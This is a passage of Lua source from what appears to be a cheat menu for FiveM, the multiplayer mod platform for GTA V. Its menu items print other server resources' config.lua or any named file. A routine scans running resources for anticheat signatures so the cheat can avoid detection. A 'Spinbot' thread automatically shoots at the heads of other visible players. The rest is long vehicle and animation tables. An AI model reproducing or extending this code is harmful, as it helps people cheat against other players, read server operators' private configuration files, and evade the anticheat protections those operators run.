                            end

                            local PrintCustom = function()
                                local file = KeyboardInput('What file to print? Don\'t forget extension (e.g. .lua)', '', 30)
                                if file then
                                    local filedata = LoadResourceFile(v['Other'], file)
                                    if filedata then
                                        print(filedata)
                                    else
                                        print('File not found')
                                    end
                                end
                            end

                            if text then
                                table.insert(Objects[v['Menu']], {
                                    ['Text'] = 'Print config.lua file [F8]',
                                    ['Type'] = 'button',
                                    ['cb'] = PrintConfig
                                })
                            end

                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Print custom file [F8]',
                                ['Type'] = 'button',
                                ['cb'] = PrintCustom
                            })

                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Back',
                                ['Type'] = 'menu',
                                ['Menu'] = 4
                            })
                        end
                        if string.find(v['Text'], "Player menu") then
                            Objects[v['Menu']] = {}
                            local menuId = v['Menu']
                            for k, v in pairs(GetActivePlayers()) do
                                table.insert(Objects[menuId], {
                                    ['Text'] = GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')',
                                    ['Type'] = 'menu',
                                    ['Menu'] = 10
                                })
                            end
                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Back',
                                ['Type'] = 'menu',
                                ['Menu'] = 1
                            })
                        end 
                        -- if string.find(v['Text'], 'Interactsound menu') then
                        --     Objects[v['Menu']] = {
                        --         {
                        --             ['Text'] = 'Interactsound spammer',
                        --             ['Type'] = 'toggle',
                        --             ['Enabled'] = false,
                        --             ['cb'] = MenuPress
                        --         },
                        --         {
                        --             ['Text'] = 'Play on all',
                        --             ['Type'] = 'list',
                        --             ['Items'] = interactsoundaudios,
                        --             ['Current'] = 1,
                        --             ['cb'] = PlayInteractSound,
                        --         },
                        --         {
                        --             ['Text'] = 'Cancel sound (self)',
                        --             ['Type'] = 'button',
                        --             ['cb'] = PlayInteractSound
                        --         },
                        --         {
                        --             ['Text'] = 'Cancel sound (all)',
                        --             ['Type'] = 'button',
                        --             ['cb'] = PlayInteractSound
                        --         },
                        --         {
                        --             ['Text'] = 'Back',
                        --             ['Type'] = 'menu',
                        --             ['Menu'] = 6
                        --         }
                        --     }
                        -- end
                        for x, y in pairs(GetActivePlayers()) do
                            if string.find(v['Text'], '(' .. GetPlayerServerId(y) .. ')') then
                                Menus[10][1] = GetPlayerName(y) .. ' (' .. GetPlayerServerId(y) .. ')'
                                for k, v in pairs(Objects[10]) do
                                    if string.find((v['Text']):lower(), 'friend') then
                                        if friends[GetPlayerServerId(y)] then
                                            v['Text'] = 'Remove friend'
                                        else
                                            v['Text'] = 'Set as friend'
                                        end
                                    end
                                    if string.find((v['Text']):lower(), 'spectat') then
                                        if spectating then
                                            if currentlyspectating == GetPlayerServerId(y) then
                                                v['Text'] = 'Stop spectating'
                                            else
                                                v['Text'] = 'Spectate'
                                            end
                                        else
                                            v['Text'] = 'Spectate'
                                        end
                                    end
                                end
                                currentplayer = GetPlayerServerId(y)
                            end
                        end
                        currentmenu = v['Menu']
                    end

                    delay = GetGameTimer() + menudelay
                elseif IsDisabledControlPressed(0, 174) then
                    local v = Objects[currentmenu][selected]
                    if v['Type'] == 'list' then
                        if v['Items'][v['Current'] - 1] then
                            v['Current'] = v['Current'] - 1
                        else
                            v['Current'] = #v['Items']
                        end
                        if Toggles['Menu sounds'] then
                            PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        end
                        delay = GetGameTimer() + menudelay
                    end
                elseif IsDisabledControlPressed(0, 175) then
                    local v = Objects[currentmenu][selected]
                    if v['Type'] == 'list' then
                        if v['Items'][v['Current'] + 1] then
                            v['Current'] = v['Current'] + 1
                        else
                            v['Current'] = 1
                        end
                        if Toggles['Menu sounds'] then
                            PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        end
                        delay = GetGameTimer() + menudelay
                    end
                end
            end
            
        end
    end
end

local Loaded = function()
    local dui = GetDuiHandle(CreateDui('https://cdn.discordapp.com/attachments/640650396968157185/724758947281633321/A_Mock-up.jpg', 2000, 1157))
    CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd('wave'), 'logo', dui)

    PlaySoundFromEntity(-1, 'VEHICLE_WATER_SPLASH_HEAVY_SCRIPT', PlayerPedId(), 0, 0, 0)

    for i = 1, 255 / 3 do
        local alpha = math.floor(i * 3)
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, alpha)
        Wait(0)
    end

    local timer = GetGameTimer() + 150
    while timer >= GetGameTimer() do
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, 255)
        Wait(0)
    end

    local HasOpened = false

    for i = 1, 255 / 2 do
        if not menuvisible and not HasOpened then
            AddTextEntry(GetCurrentResourceName(), '~INPUT_VEH_FLY_ATTACK_CAMERA~ Open menu')
            DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
        else
            HasOpened = true
        end

        local alpha = math.floor(255 - i * 2)
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, alpha)
        Wait(0)
    end

    while not menuvisible and not HasOpened do
        AddTextEntry(GetCurrentResourceName(), '~INPUT_VEH_FLY_ATTACK_CAMERA~ Open menu')
        DisplayHelpTextThisFrame(GetCurrentResourceName(), false)

        Wait(0)
    end

    StopSound()
end

local SearchAnticheat = function()
    for k, v in pairs(Anticheats) do
        for i = 0, GetNumResources() - 1 do
            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                local text = LoadResourceFile(GetResourceByFindIndex(i), v[1])
                if text then
                    if text.find((text):lower(), v[2]:lower()) then
                        print('Anticheat warning! ^1' .. GetResourceByFindIndex(i))
                        anticheatrunning = true
                        local timer = GetGameTimer() + 4500
                        while timer >= GetGameTimer() do
                            Wait(0)
                            DrawTxt(('This server is probably using an anticheat (resource: %s).\nSome functions have been disabled for your safety.'):format(GetResourceByFindIndex(i)), 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
                        end
                        return
                    end
                end
            end
        end
    end
end

local PlayerUpdate = function()
    while true do
        allplayers = {}
        for k, v in pairs(GetActivePlayers()) do
            if not friends[GetPlayerServerId(v)] then
                table.insert(allplayers, v)
            end
        end
        Wait(1000)
    end
end

vehicles = {
    ['cycles'] = {
        'BMX',
        'CRUISER',
        'FIXTER',
        'SCORCHER',
        'TRIBIKE',
        'TRIBIKE2',
        'TRIBIKE3',
    },
    ['sports'] = {
        'ALPHA',
        'BANSHEE',
        'BESTIAGTS',
        'BLISTA2',
        'BLISTA3',
        'BUFFALO',
        'BUFFALO2',
        'BUFFALO3',
        'CARBONIZZARE',
        'COMET2',
        'COMET3',
        'COMET4',
        'COMET5',
        'COQUETTE',
        'ELEGY',
        'ELEGY2',
        'FELTZER2',
        'FLASHGT',
        'FUROREGT',
        'FUSILADE',
        'FUTO',
        'GB200',
        'HOTRING',
        'ITALIGTO',
        'JESTER',
        'JESTER2',
        'KHAMELION',
        'KURUMA',
        'KURUMA2',
        'LYNX',
        'MASSACRO',
        'MASSACRO2',
        'NEON',
        'NINEF',
        'NINEF2',
        'OMNIS',
        'PARIAH',
        'PENUMBRA',
        'RAIDEN',
        'RAPIDGT',
        'RAPIDGT2',
        'RAPTOR',
        'REVOLTER',
        'RUSTON',
        'SCHAFTER2',
        'SCHAFTER3',
        'SCHAFTER4',
        'SCHAFTER5',
        'SCHLAGEN',
        'SCHWARZER',
        'SENTINEL3',
        'SEVEN70',
        'SPECTER',
        'SPECTER2',
        'SULTAN',
        'SURANO',
        'TAMPA2',
        'TROPOS',
        'VERLIERER2',
        'ZR380',
        'ZR3802',
        'ZR3803',
    },
    ['compacts'] = {
        'BLISTA',
        'BRIOSO',
        'DILETTANTE',
        'ISSI2',
        'ISSI3',
        'ISSI4',
        'ISSI5',
        'ISSI6',
        'PANTO',
        'PRAIRIE',
        'RHAPSODY',
    },
    ['offroad'] = {
        'BFINJECTION',
        'BIFTA',
        'BLAZER',
        'BLAZER2',
        'BLAZER3',
        'BLAZER4',
        'BLAZER5',
        'BODHI2',
        'BRAWLER',
        'BRUISER',
        'BRUISER2',
        'BRUISER3',
        'BRUTUS',
        'BRUTUS2',
        'BRUTUS3',
        'CARACARA',
        'DLOADER',
        'DUBSTA3',
        'DUNE',
        'DUNE2',
        'DUNE3',
        'DUNE4',
        'DUNE5',
        'FREECRAWLER',
        'INSURGENT',
        'INSURGENT2',
        'INSURGENT3',
        'KALAHARI',
        'KAMACHO',
        'MARSHALL',
        'MENACER',
        'MESA3',
        'MONSTER',
        'MONSTER3',
        'MONSTER4',
        'MONSTER5',
        'NIGHTSHARK',
        'RANCHERXL',
        'RANCHERXL2',
        'RCBANDITO',
        'REBEL',
        'REBEL2',
        'RIATA',
        'SANDKING',
        'SANDKING2',
        'TECHNICAL',
        'TECHNICAL2',
        'TECHNICAL3',
        'TROPHYTRUCK',
        'TROPHYTRUCK2',
    },
    ['sportsclassics'] = {
        'ARDENT',
        'BTYPE',
        'BTYPE2',
        'BTYPE3',
        'CASCO',
        'CHEBUREK',
        'CHEETAH2',
        'COQUETTE2',
        'DELUXO',
        'FAGALOA',
        'FELTZER3',
        'GT500',
        'INFERNUS2',
        'JB700',
        'JESTER3',
        'MAMBA',
        'MANANA',
        'MICHELLI',
        'MONROE',
        'PEYOTE',
        'PIGALLE',
        'RAPIDGT3',
        'RETINUE',
        'SAVESTRA',
        'STINGER',
        'STINGERGT',
        'STROMBERG',
        'SWINGER',
        'TORERO',
        'TORNADO',
        'TORNADO2',
        'TORNADO3',
        'TORNADO4',
        'TORNADO5',
        'TORNADO6',
        'TURISMO2',
        'VISERIS',
        'Z190',
        'ZTYPE',
    },
    ['motorcycles'] = {
        'AKUMA',
        'AVARUS',
        'BAGGER',
        'BATI',
        'BATI2',
        'BF400',
        'CARBONRS',
        'CHIMERA',
        'CLIFFHANGER',
        'DAEMON',
        'DAEMON2',
        'DEFILER',
        'DEATHBIKE',
        'DEATHBIKE2',
        'DEATHBIKE3',
        'DIABLOUS',
        'DIABLOUS2',
        'DOUBLE',
        'ENDURO',
        'ESSKEY',
        'FAGGIO',
        'FAGGIO2',
        'FAGGIO3',
        'FCR',
        'FCR2',
        'GARGOYLE',
        'HAKUCHOU',
        'HAKUCHOU2',
        'HEXER',
        'INNOVATION',
        'LECTRO',
        'MANCHEZ',
        'NEMESIS',
        'NIGHTBLADE',
        'OPPRESSOR',
        'OPPRESSOR2',
        'PCJ',
        'RATBIKE',
        'RUFFIAN',
        'SANCHEZ',
        'SANCHEZ2',
        'SANCTUS',
        'SHOTARO',
        'SOVEREIGN',
        'THRUST',
        'VADER',
        'VINDICATOR',
        'VORTEX',
        'WOLFSBANE',
        'ZOMBIEA',
        'ZOMBIEB',
    },
    ['utility'] = {
        'AIRTUG',
        'CADDY',
        'CADDY2',
        'CADDY3',
        'DOCKTUG',
        'FORKLIFT',
        'TRACTOR2',
        'TRACTOR3',
        'MOWER',
        'RIPLEY',
        'SADLER',
        'SADLER2',
        'SCRAP',
        'TOWTRUCK',
        'TOWTRUCK2',
        'TRACTOR',
        'UTILLITRUCK',
        'UTILLITRUCK2',
        'UTILLITRUCK3',
        'ARMYTRAILER',
        'ARMYTRAILER2',
        'FREIGHTTRAILER',
        'ARMYTANKER',
        'TRAILERLARGE',
        'DOCKTRAILER',
        'TR3',
        'TR2',
        'TR4',
        'TRFLAT',
        'TRAILERS',
        'TRAILERS4',
        'TRAILERS2',
        'TRAILERS3',
        'TVTRAILER',
        'TRAILERLOGS',
        'TANKER',
        'TANKER2',
        'BALETRAILER',
        'GRAINTRAILER',
        'BOATTRAILER',
        'RAKETRAILER',
        'TRAILERSMALL',
    },
    ['commercial'] = {
        'BENSON',
        'BIFF',
        'CERBERUS',
        'CERBERUS2',
        'CERBERUS3',
        'HAULER',
        'HAULER2',
        'MULE',
        'MULE2',
        'MULE3',
        'MULE4',
        'PACKER',
        'PHANTOM',
        'PHANTOM2',
        'PHANTOM3',
        'POUNDER',
        'POUNDER2',
        'STOCKADE',
        'STOCKADE3',
        'TERBYTE',
        'CABLECAR',
        'FREIGHT',
        'FREIGHTCAR',
        'FREIGHTCONT1',
        'FREIGHTCONT2',
        'FREIGHTGRAIN',
        'METROTRAIN',
        'TANKERCAR',
    },
    ['super'] = {
        'ADDER',
        'AUTARCH',
        'BANSHEE2',
        'BULLET',
        'CHEETAH',
        'CYCLONE',
        'DEVESTE',
        'ENTITYXF',
        'ENTITY2',
        'FMJ',
        'GP1',
        'INFERNUS',
        'ITALIGTB',
        'ITALIGTB2',
        'LE7B',
        'NERO',
        'NERO2',
        'OSIRIS',
        'PENETRATOR',
        'PFISTER811',
        'PROTOTIPO',
        'REAPER',
        'SC1',
        'SCRAMJET',
        'SHEAVA',
        'SULTANRS',
        'T20',
        'TAIPAN',
        'TEMPESTA',
        'TEZERACT',
        'TURISMOR',
        'TYRANT',
        'TYRUS',
        'VACCA',
        'VAGNER',
        'VIGILANTE',
        'VISIONE',
        'VOLTIC',
        'VOLTIC2',
        'XA21',
        'ZENTORNO',
    },
    ['planes'] = {
        'ALPHAZ1',
        'AVENGER',
        'AVENGER2',
        'BESRA',
        'BLIMP',
        'BLIMP2',
        'BLIMP3',
        'BOMBUSHKA',
        'CARGOPLANE',
        'CUBAN800',
        'DODO',
        'DUSTER',
        'HOWARD',
        'HYDRA',
        'JET',
        'LAZER',
        'LUXOR',
        'LUXOR2',
        'MAMMATUS',
        'MICROLIGHT',
        'MILJET',
        'MOGUL',
        'MOLOTOK',
        'NIMBUS',
        'NOKOTA',
        'PYRO',
        'ROGUE',
        'SEABREEZE',
        'SHAMAL',
        'STARLING',
        'STRIKEFORCE',
        'STUNT',
        'TITAN',
        'TULA',
        'VELUM',
        'VELUM2',
        'VESTRA',
        'VOLATOL',
    },
    ['coupes'] = {
        'COGCABRIO',
        'EXEMPLAR',
        'F620',
        'FELON',
        'FELON2',
        'JACKAL',
        'ORACLE',
        'ORACLE2',
        'SENTINEL',
        'SENTINEL2',
        'WINDSOR',
        'WINDSOR2',
        'ZION',
        'ZION2',
    },
    ['vans'] = {
        'BISON',
        'BISON2',
        'BISON3',
        'BOBCATXL',
        'BOXVILLE',
        'BOXVILLE2',
        'BOXVILLE3',
        'BOXVILLE4',
        'BOXVILLE5',
        'BURRITO',
        'BURRITO2',
        'BURRITO3',
        'BURRITO4',
        'BURRITO5',
        'CAMPER',
        'GBURRITO',
        'GBURRITO2',
        'JOURNEY',
        'MINIVAN',
        'MINIVAN2',
        'PARADISE',
        'PONY',
        'PONY2',
        'RUMPO',
        'RUMPO2',
        'RUMPO3',
        'SPEEDO',
        'SPEEDO2',
        'SPEEDO4',
        'SURFER',
        'SURFER2',
        'TACO',
        'YOUGA',
        'YOUGA2',
    },
    ['service'] = {
        'AIRBUS',
        'BRICKADE',
        'BUS',
        'COACH',
        'PBUS2',
        'RALLYTRUCK',
        'RENTALBUS',
        'TAXI',
        'TOURBUS',
        'TRASH',
        'TRASH2',
        'WASTELANDER',
        'AMBULANCE',
        'FBI',
        'FBI2',
        'FIRETRUK',
        'LGUARD',
        'PBUS',
        'POLICE',
        'POLICE2',
        'POLICE3',
        'POLICE4',
        'POLICEB',
        'POLICEOLD1',
        'POLICEOLD2',
        'POLICET',
        'POLMAV',
        'PRANGER',
        'PREDATOR',
        'RIOT',
        'RIOT2',
        'SHERIFF',
        'SHERIFF2',
        'APC',
        'BARRACKS',
        'BARRACKS2',
        'BARRACKS3',
        'BARRAGE',
        'CHERNOBOG',
        'CRUSADER',
        'HALFTRACK',
        'KHANJALI',
        'RHINO',
        'SCARAB',
        'SCARAB2',
        'SCARAB3',
        'THRUSTER',
        'TRAILERSMALL2',
    },
    ['suvs'] = {
        'BALLER',
        'BALLER2',
        'BALLER3',
        'BALLER4',
        'BALLER5',
        'BALLER6',
        'BJXL',
        'CAVALCADE',
        'CAVALCADE2',
        'CONTENDER',
        'DUBSTA',
        'DUBSTA2',
        'FQ2',
        'GRANGER',
        'GRESLEY',
        'HABANERO',
        'HUNTLEY',
        'LANDSTALKER',
        'MESA',
        'MESA2',
        'PATRIOT',
        'PATRIOT2',
        'RADI',
        'ROCOTO',
        'SEMINOLE',
        'SERRANO',
        'TOROS',
        'XLS',
        'XLS2',
    },
    ['industrial'] = {
        'BULLDOZER',
        'CUTTER',
        'DUMP',
        'FLATBED',
        'GUARDIAN',
        'HANDLER',
        'MIXER',
        'MIXER2',
        'RUBBLE',
        'TIPTRUCK',
        'TIPTRUCK2',
    },
    ['helicopters'] = {
        'AKULA',
        'ANNIHILATOR',
        'BUZZARD',
        'BUZZARD2',
        'CARGOBOB',
        'CARGOBOB2',
        'CARGOBOB3',
        'CARGOBOB4',
        'FROGGER',
        'FROGGER2',
        'HAVOK',
        'HUNTER',
        'MAVERICK',
        'POLMAV',
        'SAVAGE',
        'SEASPARROW',
        'SKYLIFT',
        'SUPERVOLITO',
        'SUPERVOLITO2',
        'SWIFT',
        'SWIFT2',
        'VALKYRIE',
        'VALKYRIE2',
        'VOLATUS',
    },
    ['boats'] = {
        'DINGHY',
        'DINGHY2',
        'DINGHY3',
        'DINGHY4',
        'JETMAX',
        'MARQUIS',
        'PREDATOR',
        'SEASHARK',
        'SEASHARK2',
        'SEASHARK3',
        'SPEEDER',
        'SPEEDER2',
        'SQUALO',
        'SUBMERSIBLE',
        'SUBMERSIBLE2',
        'SUNTRAP',
        'TORO',
        'TORO2',
        'TROPIC',
        'TROPIC2',
        'TUG',
    },
    ['sedans'] = {
        'ASEA',
        'ASEA2',
        'ASTEROPE',
        'COG55',
        'COG552',
        'COGNOSCENTI',
        'COGNOSCENTI2',
        'EMPEROR',
        'EMPEROR2',
        'EMPEROR3',
        'FUGITIVE',
        'GLENDALE',
        'INGOT',
        'INTRUDER',
        'LIMO2',
        'PREMIER',
        'PRIMO',
        'PRIMO2',
        'REGINA',
        'ROMERO',
        'SCHAFTER2',
        'SCHAFTER5',
        'SCHAFTER6',
        'STAFFORD',
        'STANIER',
        'STRATUM',
        'STRETCH',
        'SUPERD',
        'SURGE',
        'TAILGATER',
        'WARRENER',
        'WASHINGTON',
    },
    ['muscle'] = {
        'BLADE',
        'BUCCANEER',
        'BUCCANEER2',
        'CHINO',
        'CHINO2',
        'CLIQUE',
        'COQUETTE3',
        'DEVIANT',
        'DOMINATOR',
        'DOMINATOR2',
        'DOMINATOR3',
        'DOMINATOR4',
        'DOMINATOR5',
        'DOMINATOR6',
        'DUKES',
        'DUKES2',
        'ELLIE',
        'FACTION',
        'FACTION2',
        'FACTION3',
        'GAUNTLET',
        'GAUNTLET2',
        'HERMES',
        'HOTKNIFE',
        'HUSTLER',
        'IMPALER',
        'IMPALER2',
        'IMPALER3',
        'IMPALER4',
        'IMPERATOR',
        'IMPERATOR2',
        'IMPERATOR3',
        'LURCHER',
        'MOONBEAM',
        'MOONBEAM2',
        'NIGHTSHADE',
        'PHOENIX',
        'PICADOR',
        'RATLOADER',
        'RATLOADER2',
        'RUINER',
        'RUINER2',
        'RUINER3',
        'SABREGT',
        'SABREGT2',
        'SLAMVAN',
        'SLAMVAN2',
        'SLAMVAN3',
        'SLAMVAN4',
        'SLAMVAN5',
        'SLAMVAN6',
        'STALION',
        'STALION2',
        'TAMPA',
        'TAMPA3',
        'TULIP',
        'VAMOS',
        'VIGERO',
        'VIRGO',
        'VIRGO2',
        'VIRGO3',
        'VOODOO',
        'VOODOO2',
        'YOSEMITE',
    },
}

local VehicleInitialize = function()
    for k, v in pairs(vehicles) do
        table.insert(Objects[17], {
            ['Text'] = k,
            ['Type'] = 'list',
            ['Items'] = v,
            ['Current'] = 1,
            ['cb'] = SpawnVehicle,
        })
    end

    table.insert(Objects[17], {
        ['Text'] = 'Back',
        ['Type'] = 'menu',
        ['Menu'] = 12,
    })
end

local WeatherThread = function()
    while true do
        if Toggles['Lock time'] then
            NetworkOverrideClockTime(hourlocked, 0, 0)
        end
        if Toggles['Lock weather'] then
            ClearOverrideWeather()
            ClearWeatherTypePersist()
            SetWeatherTypePersist(weatherlocked)
            SetWeatherTypeNow(weatherlocked)
            SetWeatherTypeNowPersist(weatherlocked)
            if weatherlocked == 'XMAS' then
                SetForceVehicleTrails(true)
                SetForcePedFootstepsTracks(true)
            else
                SetForceVehicleTrails(false)
                SetForcePedFootstepsTracks(false)
            end
        end
        Wait(0)
    end
end

local BlipsThread = function()
    while true do

        if Toggles['PlayerBlips'] then
            PlayerBlips({
                ['Enabled'] = Toggles['PlayerBlips']
            })
        end

        Wait(10000)
    end
end

local WeaponThread = function()
    while true do
        local sleep, me = 250, PlayerPedId()
        if Toggles['Spinbot'] then
            sleep = 0

            if IsPedArmed(me, 6) then
                for k, v in pairs(allplayers) do
                    Wait(0)
                    local target = GetPlayerPed(v)
                    if DoesEntityExist(target) and target ~= me then
                        if not IsPedDeadOrDying(target) and not IsPedFatallyInjured(target) then
                            local target_pos = GetEntityCoords(target)
                            local OnScreen, ScreenX, ScreenY = World3dToScreen2d(target_pos.x, target_pos.y, target_pos.z, 0)
                            if IsEntityVisible(target) and OnScreen and HasEntityClearLosToEntity(me, target, 17) then
                                ShootAtCoord(GetPedBoneCoords(target, 31086, 0, 0, 0))
                                PedSkipNextReloading(me)
                            end
                        end
                    end
                end
            end
        end
        Wait(sleep)
    end
end

local TogglesThread = function()
    while true do
        local sleep = 250
        if Toggles['Show toggles'] then
            sleep = 0
            local offs = 0.0
            for k, v in pairs(Toggles) do
                if v then
                    if k ~= 'Show toggles' then
                        if type(v) ~= 'boolean' then
                            DrawTxt(k .. ' [' .. v .. ']', 0.0 + offs, true, nil, 0.25, 0.9, false, 0.1)
                        else
                            DrawTxt(k, 0.0 + offs, true, nil, 0.25, 0.9, false, 0.1)
                        end
                        offs = offs + 0.015
                    end
                end
            end
        end
        Wait(sleep)
    end
end

animations = {
    ["Smoke"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_SMOKING",
    },
    ["Musician"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_MUSICIAN",
    },
    ["Dj"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationmale@dj",
        ["Anim"] = "dj",
        ["Flag"] = 0,
    },
    ["Coffee"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_DRINKING",
    },
    ["Beer"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_PARTYING",
    },
    ["Air Guitar"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationmale@air_guitar",
        ["Anim"] = "air_guitar",
        ["Flag"] = 0,
    },
    ["Air Shagging"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationfemale@air_shagging",
        ["Anim"] = "air_shagging",
        ["Flag"] = 0,
    },
    ["Rock'n'roll"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_upperrock",
        ["Anim"] = "mp_player_int_rock",
        ["Flag"] = 0,
    },
    ["Drunk Standing"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_bum_standing@drunk@idle_a",
        ["Anim"] = "idle_a",
        ["Flag"] = 0,
    },
    ["Vomiting"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@taxi@tie",
        ["Anim"] = "vomit_outside",
        ["Flag"] = 0,
    },
    ["Hello"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_hello",
        ["Flag"] = 0,
    },
    ["Wave"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_common",
        ["Anim"] = "givetake1_a",
        ["Flag"] = 0,
    },
    ["Handshake"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_ped_interaction",
        ["Anim"] = "handshake_guy_a",
        ["Flag"] = 0,
    },
    ["Hugging"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_ped_interaction",
        ["Anim"] = "hugs_guy_a",
        ["Flag"] = 0,
    },
    ["Salute"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_uppersalute",
        ["Anim"] = "mp_player_int_salute",
        ["Flag"] = 0,
    },
    ["Suspect : Surrender"] = {
        ["Type"] = "animation",
        ["Dict"] = "random@arrests@busted",
        ["Anim"] = "idle_c",
        ["Flag"] = 0,
    },
    ["Fishing"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_stand_fishing",
    },
    ["Police : Investigate"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@code_human_police_investigate@idle_b",
        ["Anim"] = "idle_f",
        ["Flag"] = 0,
    },
    ["Police : Use Radio"] = {
        ["Type"] = "animation",
        ["Dict"] = "random@arrests",
        ["Anim"] = "generic_radio_chatter",
        ["Flag"] = 0,
    },
    ["Police : Traffic"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_CAR_PARK_ATTENDANT",
    },
    ["Police : Binoculars"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_BINOCULARS",
    },
    ["Agriculture : Planting"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_gardener_plant",
    },
    ["Mechanic : Fixing Motor"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@repair",
        ["Anim"] = "fixing_a_ped",
        ["Flag"] = 0,
    },
    ["Medic : Kneel"] = {
        ["Type"] = "scenario",
        ["Anim"] = "CODE_HUMAN_MEDIC_KNEEL",
    },
    ["Taxi : Talk to customer"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@taxi@driver",
        ["Anim"] = "leanover_idle",
        ["Flag"] = 0,
    },
    ["Taxi : Give bill"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@taxi@cyi",
        ["Anim"] = "std_hand_off_ps_passenger",
        ["Flag"] = 0,
    },
    ["Grocer : Give"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_am_hold_up",
        ["Anim"] = "purchase_beerbox_shopkeeper",
        ["Flag"] = 0,
    },
    ["Barman : Serve Shot"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@drinking",
        ["Anim"] = "shots_barman_b",
        ["Flag"] = 0,
    },
    ["Journalist : Take Photos"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_PAPARAZZI",
    },
    ["All Jobs : Clipboard"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_CLIPBOARD",
    },
    ["All Jobs : Hammering"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_HAMMERING",
    },
    ["Bum : Holding Sign"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_BUM_FREEWAY",
    },
    ["Bum : Human Statue"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_HUMAN_STATUE",
    },
    ["Cheering"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_CHEERING",
    },
    ["Super"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_action",
        ["Anim"] = "thanks_male_06",
        ["Flag"] = 0,
    },
    ["Point"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_point",
        ["Flag"] = 0,
    },
    ["Come here"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_come_here_soft",
        ["Flag"] = 0,
    },
    ["Bring it on"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_bring_it_on",
        ["Flag"] = 0,
    },
    ["Me"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_me",
        ["Flag"] = 0,
    },
    ["I knew it"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@am_hold_up@male",
        ["Anim"] = "shoplift_high",
        ["Flag"] = 0,
    },
    ["Exhausted"] = {
        ["Type"] = "scenario",
        ["Anim"] = "idle_d",
    },
    ["I'm the shit"] = {
        ["Type"] = "scenario",
        ["Anim"] = "idle_a",
    },
    ["Facepalm"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationmale@face_palm",
        ["Anim"] = "face_palm",
        ["Flag"] = 0,
    },
    ["Calm down "] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_easy_now",
        ["Flag"] = 0,
    },
    ["What did I do?"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@assassinate@multi@",
        ["Anim"] = "react_big_variations_a",
        ["Flag"] = 0,
    },
    ["Fear"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@code_human_cower_stand@male@react_cowering",
        ["Anim"] = "base_right",
        ["Flag"] = 0,
    },
    ["Fight ?"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@deathmatch_intros@unarmed",
        ["Anim"] = "intro_male_unarmed_e",
        ["Flag"] = 0,
    },
    ["It's not possible !"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_damn",
        ["Flag"] = 0,
    },
    ["Embrace"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_ped_interaction",
        ["Anim"] = "kisses_guy_a",
        ["Flag"] = 0,
    },
    ["Finger of honor"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_upperfinger",
        ["Anim"] = "mp_player_int_finger_01_enter",
        ["Flag"] = 0,
    },
    ["You wanker"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_upperwank",
        ["Anim"] = "mp_player_int_wank_01",
        ["Flag"] = 0,
    },
